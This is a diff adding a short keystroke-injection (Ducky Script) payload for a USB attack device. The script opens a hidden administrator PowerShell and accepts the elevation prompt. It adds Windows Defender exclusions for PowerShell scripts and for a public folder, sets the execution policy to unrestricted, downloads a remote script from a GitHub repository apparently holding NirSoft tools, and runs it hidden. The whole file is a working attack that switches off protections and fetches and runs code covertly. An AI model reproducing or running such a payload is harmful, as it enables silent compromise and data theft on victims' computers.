@@ -1,0 +1,28 @@
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell.exe -windowstyle hidden
+DELAY 300
+CTRL SHIFT ENTER
+DELAY 2000
+LEFT
+DELAY 300
+ENTER
+DELAY 2000
+STRING cd C:\Users\Public\Documents
+DELAY 150
+ENTER
+STRING Add-MpPreference -ExclusionExtension ps1 -Force
+ENTER
+STRING Set-ExecutionPolicy unrestricted -Force
+ENTER
+STRING Add-MpPreference -ExclusionPath C:\Users\Public\Documents\ -Force
+ENTER
+STRING wget "https://github.com/kidarok/Nirsoft_Tools/blob/main/main.ps1?raw=true" -OutFile main.ps1
+DELAY 400
+ENTER
+DELAY 4000
+STRING powershell.exe -noexit -windowstyle hidden -file main.ps1
+ENTER
+DELAY 150
+STRING EXIT
